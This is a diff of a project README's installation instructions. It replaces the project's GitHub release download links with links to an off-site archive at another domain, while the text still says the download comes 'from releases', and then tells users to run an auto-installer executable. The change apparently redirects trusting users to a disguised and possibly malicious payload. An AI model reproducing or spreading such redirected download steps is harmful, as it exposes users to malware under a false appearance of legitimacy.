@@ -5,9 +5,9 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/6ec25db6-7f40-4669-81f2-65b8f236ee59)
-](https://github.com/SABRY225/SilenceGen/releases/download/V3.2/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
-## **1. [Download the archive](https://github.com/SABRY225/SilenceGen/releases/download/V3.2/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 ![hgjgh](https://github.com/user-attachments/assets/59a78a50-ac5e-4d3b-b9a8-f20850b26ab1)
